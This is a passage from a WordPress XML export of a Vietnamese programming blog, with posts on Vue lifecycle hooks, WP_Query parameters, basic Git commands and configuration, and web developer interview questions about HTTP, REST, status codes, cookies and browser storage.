		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1634</guid>
		<description></description>
		<content:encoded><![CDATA[<table>
<thead>
<th style="width: 40%">Vue 2</th>
<th>Vue 3</th>
</thead>
<tbody>
<tr>
<td><img src="https://vuejs.org/images/lifecycle.png" alt="" /></td>
<td><img src="https://v3.vuejs.org/images/lifecycle.svg" alt="" /></td>
</tr>
</tbody>
</table>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1634</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 03:00:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-14 20:00:42]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:51:05]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:51:05]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-tutorial-3-lifecycle]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Wordpress - Các tham số Query bài viết trong WP_Query]]></title>
		<link>https://duycode.com/2021/07/30/wordpress-cac-tham-so-query-bai-viet-trong-wp_query/</link>
		<pubDate>Fri, 30 Jul 2021 11:07:59 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1643</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
// Source: https://gist.github.com/luetkemj/2023628
// Xem hướng dẫn WP_Query toàn tập: http://goo.gl/kRpzTz
<?php
$args = array( 
  
//////Author Parameters - Tham số lấy bài viết theo tác giả
    //http://codex.wordpress.org/Class_Reference/WP_Query#Author_Parameters
    'author' => '1,2,3,',                     //(int) - Các ID tác giả cần lấy bài viết (thêm dấu - vào để loại trừ tác giả, ví dụ: -14, -20)
    'author_name' => 'luetkemj',              //(string) - Lấy bài viết dựa theo tên nick name của tác giả
    'author__in' => array( 2, 6 ),            //(array) - Lấy bài dựa theo ID của tác giả
    'author__not_in' => array( 2, 6 ),        //(array)' - Các ID của tác giả không muốn lấy bài
  
//////Category Parameters - Tham số lấy bài viết dựa theo category
    //http://codex.wordpress.org/Class_Reference/WP_Query#Category_Parameters
    'cat' => 5,//(int) - Lấy bài dựa theo ID của category
    'category_name' => 'staff, news',          //(string) - Lấy bài dựa theo category slug
    'category__and' => array( 2, 6 ),         //(array) - Lấy bài mà nó mang cả hai category 2 và 6 (ID)
    'category__in' => array( 2, 6 ),          //(array) - ID của các category không muốn lấy bài
    'category__not_in' => array( 2, 6 ),      //(array) - Các ID của category không muốn lấy bài
     
//////Tag Parameters - Tham số lấy bài viết dựa theo tag
    //http://codex.wordpress.org/Class_Reference/WP_Query#Tag_Parameters
    'tag' => 'cooking',                       //(string) - Lấy bài viết theo tag slug
    'tag_id' => 5,                            //(int) - Lấy bài viết theo tag ID
    'tag__and' => array( 2, 6),               //(array) - Lấy bài viết mà nó mang cả hai tag có ID 2 và 6
    'tag__in' => array( 2, 6),                //(array) - Lấy tất cả bài viết trong nhiều tag ID khác nhau
    'tag__not_in' => array( 2, 6),            //(array) - Các tag ID không muốn lấy bài
    'tag_slug__and' => array( 'red', 'blue'), //(array) - Lấy bài viết mà nó mang cả hai tag có slug red và blue
    'tag_slug__in' => array( 'red', 'blue'),  //(array) - Lấy bài viết trong nhiều tag slug khác nhau
  
//////Taxonomy Parameters - Lấy bài viết dựa theo taxonomy
    //http://codex.wordpress.org/Class_Reference/WP_Query#Taxonomy_Parameters
    //Quan trọng: tax_query là tham số có thể sẽ chứa nhiều mảng lồng vào bên trong
    'tax_query' => array(                     //(array) - Lấy bài viết dựa theo taxonomy
    'relation' => 'AND',                      //(string) - Mối quan hệ giữa các tham số bên trong, AND hoặc OR
      array(
        'taxonomy' => 'color',                //(string) - Tên của taxonomy
        'field' => 'slug',                    //(string) - Loại field cần xác định term của taxonomy, sử dụng 'id' hoặc 'slug'
        'terms' => array( 'red', 'blue' ),    //(int/string/array) - Slug của các terms bên trong taxonomy cần lấy bài
        'include_children' => true,           //(bool) - Lấy category con, true hoặc false
        'operator' => 'IN'                    //(string) - Toán tử áp dụng cho mảng tham số này. Sử dụng 'IN' hoặc 'NOT IN'
      ),
      array(
        'taxonomy' => 'actor',
        'field' => 'id',
        'terms' => array( 103, 115, 206 ),
        'include_children' => false,
        'operator' => 'NOT IN'
      )
    ),

//////Post & Page Parameters - Lấy bài viết dựa vào tham số của Post hoặc Page
    //http://codex.wordpress.org/Class_Reference/WP_Query#Post_.26_Page_Parameters
    'p' => 1,                               //(int) - ID của post cần hiển thị
    'name' => 'hello-world',                //(string) - Slug của post cần hiển thị
    'page_id' => 1,                         //(int) - ID của page cần hiển thị
    'pagename' => 'sample-page',            //(string) - Slug của page cần hiển thị
    'pagename' => 'contact_us/canada',      //(string) - Hiển thị page con bằng slug của page mẹ và page con, cách nhau bởi dấu gạch chéo
    'post_parent' => 1,                     //(int) - Lấy page con dựa vào ID của page mẹ
    'post_parent__in' => array(1,2,3)       //(array) - Lấy nhiều page con dựa vào nhiều page mẹ thông qua ID
    'post_parent__not_in' => array(1,2,3),  //(array) - Các ID của page mẹ không muốn hiển thị page con
    'post__in' => array(1,2,3),             //(array) - Danh sách các post cần lấy, dùng ID
    'post__not_in' => array(1,2,3),         //(array) - Danh sách các post không muốn lấy, dùng ID
    //NOTE: Bạn không thể sử dụng 'post__in' cùng với 'post__not_in' trong một query

//////Password Parameters - Lấy các bài viết dựa theo thiết lập mật khẩu của post
    //http://codex.wordpress.org/Class_Reference/WP_Query#Password_Parameters
    'has_password' => true,                 //(bool) - Lấy các bài viết có đặt password
                                              //true bài viết có pass 
                                              //false bài viết không có pass
                                              //null Mặc định nó sẽ lấy toàn bộ post có pass và không có pass
    'post_password' => 'multi-pass',          //(string) - show posts with a particular password (available with Version 3.9)

//////Type - Hiển thị post dựa vào loại post 
    //http://codex.wordpress.org/Class_Reference/WP_Query#Type_Parameters
    'post_type' => array(                   //(string / array) - tên post type cần lấy bài viết. Mặc định là 'post'
            'post',                         // -  post.
            'page',                         // - page.
            'revision',                     // - revision.
            'attachment',                   // - tập tin đính kèm. 
            'my-post-type',                 // - Tên custom post type
            ),
    'post_type' => 'any',                   // - Lấy bất kỳ post type đang có trên website

//////Status Parameters - Lấy các bài viết dựa theo trạng thái của nó
    //http://codex.wordpress.org/Class_Reference/WP_Query#Status_Parameters
    'post_status' => array(                 //(string / array)       
            'publish',                      // - Post hoặc Page đã được publish
            'pending',                      // - Post đang ở trạng thái Pending Review
            'draft',                        // - Post đang trong nháp
            'auto-draft',                   // - Các bài viết tự động lưu nháp
            'future',                       // - Bài viết đang được đặt thời gian đăng trong tương lai
            'private',                      // - Bài viết đang trong trạng thái riêng tư
            'inherit',                      // - Lấy một bản revision
            'trash'                         // - Lấy post từ thùng rác
            ),
    'post_status' => 'any',                 // - Sử dụng bất kỳ trạng thái nào


    
//////Pagination Parameters
    //http://codex.wordpress.org/Class_Reference/WP_Query#Pagination_Parameters
    'posts_per_page' => 10,                 //(int) - Số lượng bài viết cần lấy ra để hiển thị trên mỗi trang. Nếu muốn hiển thị toàn bộ thì đặt giá trị là -1
    'posts_per_archive_page' => 10,         //(int) - Số lượng bài viết cần lấy ra hiển thị trên mỗi trang. Nhưng chỉ sử dụng cho các trang lưu trữ.
    'nopaging' => false,                    //(bool) - Nếu muốn sử dụng phân trang thì đặt là false. True sẽ hiển thị tất cả post. Mặc định là false.
    'paged' => get_query_var('paged'),      //(int) - Số trang hiện tại.
                                            //NOTE: Sử dụng get_query_var('page') nếu bạn cần sử dụng nó ở một Custom Page Template
    										// http://codex.wordpress.org/Function_Reference/next_posts_link#Usage_when_querying_the_loop_with_WP_Query
                                            // http://codex.wordpress.org/Pagination#Troubleshooting_Broken_Pagination
    'offset' => 3,                          // (int) - Số bài viết trước đó mà bạn muốn bỏ qua.
                                            // Warning: Thiết lập này sẽ làm cho phần phân trang bị lỗi, xem thêm: http://codex.wordpress.org/Making_Custom_Queries_using_Offset_and_Pagination
    										// Nếu tham số 'posts_per_page' có giá trị là -1 thì offset sẽ bị bỏ qua.

                                            
    'page' => get_query_var('page'),        // (int) - Số trang hiện tại sử dụng cho Custom Page Template.
                                            
    'ignore_sticky_posts' => false,         // (boolean) - Tuỳ chọn có lấy bài viết được Sticky hay không. Nếu false thì sẽ hiển thị, true thì bỏ qua.

	//////Order & Orderby Parameters - Thiết lập kiểu sắp xếp các bài viết
    //http://codex.wordpress.org/Class_Reference/WP_Query#Order_.26_Orderby_Parameters
    'order' => 'DESC',                      //(string) - Thiết lập hiển thị tăng dần hay giảm dần.
                                              //Possible Values:
                                              //'ASC' - Hiển thị kiểu tăng dần (1, 2, 3; a, b, c).
                                              //'DESC' - Hiển thị kiểu giảm dần (3, 2, 1; c, b, a).
    'orderby' => 'date',                    //(string) - Thiết lập loại dữ liệu sẽ được sắp xếp dựa vào. Mặc định nó sẽ là tham số 'date' để dựa vào ngày đăng bài.
                                              //Possible Values:
                                              //'none' - Không sắp xếp
                                              //'ID' - Sắp xếp bởi ID bài viết
                                              //'author' - Sắp xếp bởi tác giả
                                              //'title' - Sắp xếp bởi tiêu đề
                                              //'name' - Sắp xếp bởi slug
                                              //'date' - Sắp xếp bởi ngày tháng
                                              //'modified' - Sắp xếp bởi ngày cập nhật
                                              //'parent' - Sắp xếp bởi ID của page mẹ
                                              //'rand' - Sắp xếp ngaẫu nhiên
                                              //'comment_count' - Sắp xếp bởi số lượng bình luận
                                              //'menu_order' - Sắp xếp bởi thứ tự của trang
                                              //'meta_value' - Sắp xếp bởi giá trị meta data
                                              //'meta_value_num' - Sắp xếp bởi giá trị dạng số tự nhiên của meta data
																							 
//////Date Parameters - Lấy bài viết trong khoảng thời gian cố định
    //http://codex.wordpress.org/Class_Reference/WP_Query#Date_Parameters

    'date_query' => array(                  //(array) - Date parameters (available with Version 3.7).
                                              //these are super powerful. check out the codex for more comprehensive code examples http://codex.wordpress.org/Class_Reference/WP_Query#Date_Parameters
      array(
	    'year' => 2014,                         //(int) - năm cần lấy bài (e.g. 2011).
	    'monthnum' => 4,                        //(int) - Tháng cần lấy bài (from 1 to 12).
	    'w' =>  25,                             //(int) - Số tuần trong năm cần lấy bài (từ 0 đến 53).
	    'day' => 17,                            //(int) - Lấy bài dựa theo ngày trong tháng (từ 1 đến 31).
	    'hour' => 13,                           //(int) - Lấy bài dựa theo giờ trong ngày (từ 0 đến 23).
	    'minute' => 19,                         //(int) - Lấy bài dựa theo phút trong giờ (từ 0 đến 60).
	    'second' => 30,                         //(int) - Lấy bài dựa theo giây trong phút (0 đến 60).
	    'm' => 201404,                          //(int) - Tháng của năm cần lấy bài (Ví dụ: 201307).
        'after'     => 'January 1st, 2013', //(string/array) - Lấy bài viết sau ngày cố định. Có thể sử dụng strtotime()-compatible string, hoặc sử dụng array gồm 'year', 'month', 'day'
        'before'    => array(               //(string/array) - Lấy bài viết trước ngày cố định. Có thể sử dụng strtotime()-compatible string, hoặc sử dụng array gồm 'year', 'month', 'day'
          'year'  => 2013,                  
          'month' => 2,                     
          'day'   => 28,                    
        ),
        'inclusive' => true,                //(boolean) - Nếu sử dụng before và after, sử dụng 'true' nếu muốn bao gồm cả hai tham số.
        'compare' =>  '=',                  //(string) - So sánh giá trị với '=', '!=', '>', '>=', '<', '<=', 'LIKE', 'NOT LIKE', 'IN', 'NOT IN', 'BETWEEN', 'NOT BETWEEN', 'EXISTS' (only in WP >= 3.5), and 'NOT EXISTS' (also only in WP >= 3.5). Default value is '='
        'column' => 'post_date',            //(string) - Cột dữ liệu mà cần gửi query đến, mặc định là 'post_date'
        'relation' => 'AND',                //(string) - OR hoặc AND, sử dụng khi có nhiều array trong date_query để tạo mối quan hệ
      ),
    ),

//////Custom Field Parameters - Lấy bài viết dựa theo custom field
    //http://codex.wordpress.org/Class_Reference/WP_Query#Custom_Field_Parameters
    'meta_key' => 'key',                    //(string) - Lấy bài dựa theo meta key của custom field
    'meta_value' => 'value',                //(string) - Lấy bài dựa theo giá trị của custom field
    'meta_value_num' => 10,                 //(number) - Giá trị của custom field dạng số tự nhiên
    'meta_compare' => '=',                  //(string) - Toán tử để so sánh với 'meta_value'. Có thể sử dụng '!=', '>', '>=', '<', or ='. Mặc định là '='.
    'meta_query' => array(                  //(array)  - Sử dụng nhiều điều kiện lấy bài viết theo custom field 
       'relation' => 'AND',                 //(string) - Mối quan hệ của các array query bên trong, sử dụng 'OR' hoặc 'AND'
       array(
         'key' => 'color',                  //(string) - Tên meta key
         'value' => 'blue'                  //(string/array) - Giá trị meta value
         'type' => 'CHAR',                  //(string) - Loại giá trị. Có thể sử dụng 'NUMERIC', 'BINARY', 'CHAR', 'DATE', 'DATETIME', 'DECIMAL', 'SIGNED', 'TIME', 'UNSIGNED'. Mặc định là 'CHAR'. Tham số 'type' DATE chỉ có thể hoạt động với tham số 'compare' nếu định dạng ngày tháng được sử dụng là YYYYMMDD.
                                            
         'compare' => '='                   //(string) - Toán tử so sánh với giá trị value trong mảng này. Có thể sử dụng '=', '!=', '>', '>=', '<', '<=', 'LIKE', 'NOT LIKE', 'IN', 'NOT IN', 'BETWEEN', 'NOT BETWEEN', 'EXISTS' (only in WP >= 3.5), and 'NOT EXISTS' (also only in WP >= 3.5). Default value is '='.
       ),
       array(
         'key' => 'price',
         'value' => array( 1,200 ),
         'compare' => 'NOT LIKE'
       )
    ), 

//////Caching Parameters
    //http://codex.wordpress.org/Class_Reference/WP_Query#Caching_Parameters
    //NOTE Caching is a good thing. Setting these to false is generally not advised.
    'cache_results' => true,                //(bool) Mặc định là true - Lưu cache của thông tin kết quả query
    'update_post_term_cache' => true,       //(bool) Default is true - Post meta information cache.
    'update_post_meta_cache' => true,       //(bool) Default is true - Post term information cache.
    
    'no_found_rows' => false,               //(bool) Xem thêm: http://flavio.tordini.org/speed-up-wordpress-get_posts-and-query_posts-functions
    

//////Search Parameter - Lấy bài viết dựa theo truy vấn tìm kiếm
    //http://codex.wordpress.org/Class_Reference/WP_Query#Search_Parameter
    's' => $s,                              //(string) - Từ khoá tìm kiếm bài viết. $s chính là biến lưu từ khoá truy vấn tìm kiếm khi tìm thông qua form tìm kiếm.
    'exact' => true,                        //(bool) - Tìm nội dung khớp chính xác với từ khoá tìm kiếm
    'sentence' => true,                     //(bool) - Sử dụng tìm kiếm trong cụm từ
         


);

$the_query = new WP_Query( $args );

// The Loop
if ( $the_query->have_posts() ) :
while ( $the_query->have_posts() ) : $the_query->the_post();
  // Do Stuff
endwhile;
endif;

// Reset Post Data
wp_reset_postdata();

?>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1643</wp:post_id>
		<wp:post_date><![CDATA[2021-07-30 18:07:59]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-30 11:07:59]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-30 18:07:59]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-30 11:07:59]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[wordpress-cac-tham-so-query-bai-viet-trong-wp_query]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
						</item>
					<item>
		<title><![CDATA[Git cơ bản - 1. Làm việc trên Local]]></title>
		<link>https://duycode.com/2021/09/01/git-co-ban-1-lam-viec-tren-local/</link>
		<pubDate>Tue, 31 Aug 2021 18:00:53 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=55</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Cài đặt Git</h2>
* Download và cài đặt Git-scm
<a href="https://git-scm.com/" rel="noopener" target="_blank">https://git-scm.com/</a>
<img src="https://git-scm.com/images/logo@2x.png" alt="" />
<h2>2. Git status Lifecycle</h2>
<pre>
                                                                   new Commit (558f68c) -----►┐
                                                                                              │
              (1)                       (4)                                                   │
Untracked --------------► Staged --------------► Unmodified ====== new Commit (41ab78e) -----►│ 
                           ▲  │                                                               │
                           │  │                                                               │  
                        (3)│  │(2)                                                        (5) │ 
                           │  │                                                               │ 
                           │  ▼                                                               │
                         Modified ◄------------------┐   ┌------------------------------------┘
                                                     │   │
                                                 (2) │   │
                                                     │   │
                                                     │   │                                             
              (1)                       (4)          │   ▼      
Untracked --------------➤ Staged --------------➤ Unmodified ====== first Commit (2a64238)

// Có 4 trạng thái của File như trên hình.
// Trạng thái modified và staged là trạng thái chỉ lưu 1 phiên bản của 1 file.
// Nếu cùng 1 file đi vào trạng thái đó thì sẽ bị ghi đè
// Trạng thái: Unmodified là trạng thái commit --> có thể lưu nhiều phiên bản
</pre>

<pre>
// Kiểm tra trạng thái file
git status 

git add src/index.js                          (1) (3)
get commit -m "add function xyz"              (4)

//Ngược chiều, hoàn trả thao tác trước đó
git restore --stage src/index.js              (-1) (-3)
git restore src/index.js                      (-2)

// Kiểm tra các commit trước đó
git log --oneline -10

// Đưa về trạng thái commit "2a64238" trước đó
// Xóa tất cả các file làm việc, đưa hoàn toàn project về trạng thái đó
git reset --hard 2a64238                      (5)

// Đưa về trạng thái commit "2a64238" trước đó
// Các file đang làm việc được giữ và đưa về trạng thái "Staging" sau commit 2a64238 
git reset --soft 2a64238                      

// Đưa về trạng thái commit "2a64238" trước đó
// Các file đang làm việc được giữ và đưa về trạng thái "Working" sau commit 2a64238 
git reset --mixed 2a64238                      
</pre>

<h2> 3. Remote</h2>
<pre>
//Xem các remote đang sử dụng
git remote
git remote -v

//Tạo một remote mới với kèm theo tên. VD: github với tên origin
git remote add <name> <url>
git remote add origin https://github.com/duycode/myproject.git
git remote add second https://github.com/paulboone/ticgit.git

//Xóa một remote. VD: xóa remote origin
git remote remove <name>
git remote remove origin 

//Push code lên git (sau khi add và commit)
git push <name> <branch>
git push origin master
</pre>


]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>55</wp:post_id>
		<wp:post_date><![CDATA[2021-09-01 01:00:53]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-31 18:00:53]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-09-01 01:00:53]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-08-31 18:00:53]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[git-co-ban-1-lam-viec-tren-local]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[Git cơ bản – 3. Config Git]]></title>
		<link>https://duycode.com/2021/09/01/flex-co-ban/</link>
		<pubDate>Tue, 31 Aug 2021 20:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=84</guid>
		<description></description>
		<content:encoded><![CDATA[<h2> I. Mỗi project một tài khoản GIT riêng</h2>
- Kiểm tra tài khoản trên máy tính hiện tại:
<pre>
git config --list
# user.email=duycode.com@gmail.com
# user.name=duycode-com
# ...
// Có thể xóa tài khoản Git trên window --> Run: "Credential Manager"
</pre>

- Cài đặt account GIT riêng : Vào repository/.git/config --> Thêm vào cuối

<pre>
[user]
    name = duycode-com
    email = duycode.com@gmail.com
[credential "https://github.com/duycode-com/mern-stack.git"]
    username = duycode-com  
</pre>

<h2>II. Một số lỗi nhỏ hay gặp</h2>
<h3> 1. Fix lỗi CRLF</h3>
<pre>
git config core.autocrlf false

git rm --cached -r .

git reset --hard
</pre>

<h3> 2. Thêm file hoặc thư mục vào .gitignore không thành công</h3>
- Lý do là file đó đã được theo dõi bởi git
<pre>
// Ví dụ xóa file .env
// 1. Xóa theo dõi file bởi git
git reset .env

// 2. Xóa trên git remote
git rm --cached .env
git add .
git commit -m "update iggnore"
git push github master
</pre>

- Đơn giản hơn, xóa sạch cache rồi commit lại
<pre>
git rm -r --cached .
// update .gitignore
git add .
git commit -m "Update .gitignore"
git push
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>84</wp:post_id>
		<wp:post_date><![CDATA[2021-09-01 03:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-31 20:00:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-24 10:40:07]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-24 03:40:07]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[flex-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[Câu hỏi Web Developer P2]]></title>
		<link>https://duycode.com/2021/12/01/cau-hoi-web-developer-p2/</link>
		<pubDate>Wed, 01 Dec 2021 02:00:46 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=582</guid>
		<description></description>
		<content:encoded><![CDATA[<details>
<summary>Câu 1. Sự khác nhau giữa HTTP và HTTPS ?</summary>
- HTTP: HyperText Transfer Protocol: là một giao thức ứng dụng của bộ giao thức TCP/IP. Bộ giao thức này được đặt tên theo 2 giao thức chính là: TCP (Transmission Control Protocol – Giao thức điều khiển truyền vận) và IP (Internet Protocol – Giao thức Internet).
- HTTPS: HyperText Transfer Protocol Secure: HTTPS chính là giao thức HTTP được bổ sung thêm chứng chỉ SSL (Secure Sockets Layer – tầng ổ bảo mật) hoặc TLS (Transport Layer Security – bảo mật tầng truyền tải)

<strong>A.Cơ bản</strong>
1. URL trên trình duyệt hiển thị là http -> màu đỏ, https -> màu xanh
2. Cổng sử dụng: HTTP sử dụng cổng: 80, HTTPS sử dụng cổng: 443
3. HTTP không cần chứng chỉ SSL, với HTTPS bạn phải có chứng chỉ SSL và chứng chỉ này được ký bởi CA.
4. HTTPS mã hóa dữ liệu liên lạc khiến hacker không hiểu được thông tin
<img src="https://sites.google.com/site/dichvumaychu789/_/rsrc/1516173796150/khac-biet-giua-http-va-https/Kh%C3%A1c%20bi%E1%BB%87t%20gi%E1%BB%AFa%20HTTP%20v%C3%A0%20HTTPS-3.jpg" alt="" />

- Cả SSL và TLS đều sử dụng hệ thống PKI (Public Key Infrastructure -hạ tầng khóa công khai) không đối xứng. Hệ thống này sử dụng hai “khóa” để mã hóa thông tin liên lạc, “khóa công khai” (public key) và “khóa riêng” (private key). Bất cứ thứ gì được mã hóa bằng khóa công khai chỉ có thể được giải mã bởi khóa riêng và ngược lại. Các tiêu chuẩn này đảm bảo các nội dung sẽ được mã hóa trước khi truyền đi, và giải mã khi nhận. Điều này khiến hacker dù có chen ngang lấy được thông tin cũng không thể “hiểu” được thông tin đó.
</details>

<h3>Câu 2. RESTful API là gì ? Kể tên các phương thức HTTP Request ?</h3>
<div data-tag='container'><button onclick="toggleContent(this)">Show/Hide</button><div style="display: none;" data-tag='content'>
<strong>1. Interface là gì</strong>
- Interface là cách các đối tượng giao tiếp với nhau: 3 dạng thường gặp: CLI, GUI, API
- CLI (Command Line Interface) : người dùng và chương trình giao tiếp với nhau bằng dòng lệnh
- GUI (Graphical User Interface) : người dùng và chương trình giao tiếp với nhau thông qua các nút bấm, hình ẩm
- API (Application Programming Interface) : các ứng dụng giao tiếp với nhau
Trong lập trình web, API thường truyền dữ liệu dạng JSON hay XML

<strong>2. REST là gì</strong>
- REST (REpresentational State Transfer) : là một kiểu kiến trúc để viết API, nó sử dụng HTTP để giao tiếp giữa các ứng dụng
- RESTful API: là một tiêu chuẩn, một trong những kiểu thiết kế API phổ biến

<strong>3. Các method HTTP Request</strong>
- GET
- POST : Tạo record mới
- PUT : Ghi đè record
- PATCH : Cập nhật một phần record
- DELETE
- HEAD : response chỉ trả về header, không có body
- CONNECT: kết nối tới SERVER theo URI
- OPTIONS
- TRACE

<button onclick="toggleContent(this)">Hide</button></div></div>

<h3>Câu 3. Kể tên một vài HTTP Status Code ?</h3>
<div data-tag='container'><button onclick="toggleContent(this)">Show/Hide</button><div style="display: none;" data-tag='content'>
HTTP Status Code có 5 hạng mục bao gồm:
1. 1xx (100 – 199): Information responses / Phản hồi thông tin – Yêu cầu đã được chấp nhận và quá trình xử lý yêu cầu của bạn đang được tiếp tục.

2. 2xx (200 – 299): Successful responses / Phản hồi thành công – Yêu cầu của bạn đã được máy chủ tiếp nhận, hiểu và xử lý thành công.
- 200 OK : Phản hồi thành công cho những phương thức GET, PUT, PATCH, hoặc DELETE
- 201 Created : Yêu cầu POST hoặc PUT thành công
- 204 No Content : Request xóa thành công

3. 3xx (300 – 399): Redirects / Điều hướng – Phía client cần thực hiện hành động bổ sung để hoàn tất yêu cầu.

4. 4xx (400 – 499): Client errors / Lỗi phía client – Yêu cầu không thể hoàn tất hoặc yêu cầu chứa cú pháp không chính xác. 4xx sẽ hiện ra khi có lỗi từ phía client do không đưa ra yêu cầu hợp lệ.
- 400 Bad Request : Request không hợp lệ
- 401 Unauthorized : Request cần có tài khoản
- 403 Forbidden : Bị server từ chối (do tài khoản không được phân quyền)
- 404 Not Found : Không tìm thấy trang

5. 5xx (500 – 599): Server errors / Lỗi phía máy chủ – Máy chủ không thể hoàn thành yêu cầu được cho là hợp lệ. Khi 5xx xảy ra, bạn chỉ có thể đợi để bên hệ thống máy chủ xử lý xong.
- 500: lỗi chung chung
- 503: Máy chủ quá tải hoặc đang bảo trì
- 505: Không hỗ trợ giao thức HTTP
<button onclick="toggleContent(this)">Hide</button></div></div>

<h3>Câu 4. Phân biệt Cookie và Session ?</h3>
<div data-tag='container'><button onclick="toggleContent(this)">Show/Hide</button><div style="display: none;" data-tag='content'>
- Bình thường: Client gửi 1 request lên Server, Server trả về 1 response. Sau khi hoàn thành 1 connect, server sẽ "quên" mọi thứ về Client
- Cookie và Session sinh ra để giải quyết vấn đề: làm thế nào để server ghi nhớ thông tin của client
<table>
<tbody>
<tr>
<td>Cookie</td>
<td>Session (Server)</td>
</tr>
<tr>
<td>- Mỗi request l&ecirc;n server đều được đ&iacute;nh k&eacute;m cookie</td>
<td>- Mỗi phi&ecirc;n l&agrave;m việc mới sẽ được cấp một SessionID mới</td>
</tr>
<tr>
<td>- Lưu trữ tr&ecirc;n tr&igrave;nh duyệt</td>
<td>- Lưu trữ tại 1 file tr&ecirc;n server</td>
</tr>
<tr>
<td>- Tồn tại đến khi expired</td>
<td>- Tồn tại tr&ecirc;n 1 phi&ecirc;n l&agrave;m việc (đ&oacute;ng tab).</td>
</tr>
<tr>
<td>- K&iacute;ch thước cookie tối đa l&agrave; 4096 bytes</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<button onclick="toggleContent(this)">Hide</button></div></div>

<h3>Câu 5. Phân biệt Local Storage và Session Storage và Cookie ?</h3>
<div data-tag='container'><button onclick="toggleContent(this)">Show/Hide</button><div style="display: none;" data-tag='content'>
- Local Storage, Session Storage và Cookie sinh ra để lưu trữ dữ liệu trên trình duyệt
<table>
<tbody>
<tr>
<td>Local Storage</td>
<td>Session&nbsp;Storage</td>
<td>Cookie</td>
</tr>
<tr>
<td>- Lưu trữ tr&ecirc;n tr&igrave;nh duyệt</td>
<td>- Lưu trữ tr&ecirc;n tr&igrave;nh duyệt</td>
<td>- Lưu trữ tr&ecirc;n tr&igrave;nh duyệt</td>
</tr>
<tr>
<td>-&nbsp;Chỉ Client sử dụng được. Client đọc hoặc viết bằng Javascript</td>
<td>-&nbsp;Chỉ Client sử dụng được. Client đọc hoặc viết bằng Javascript</td>
<td>- Client đọc hoặc viết bằng Javascript, nếu set httpOnly th&igrave; JS sẽ kh&ocirc;ng đọc được<br />- Server đọc hoặc viết Cookie</td>
</tr>
<tr>
<td>-&nbsp;Tồn tại&nbsp;vĩnh viễn, chỉ mất&nbsp;khi cố t&igrave;nh x&oacute;a</td>
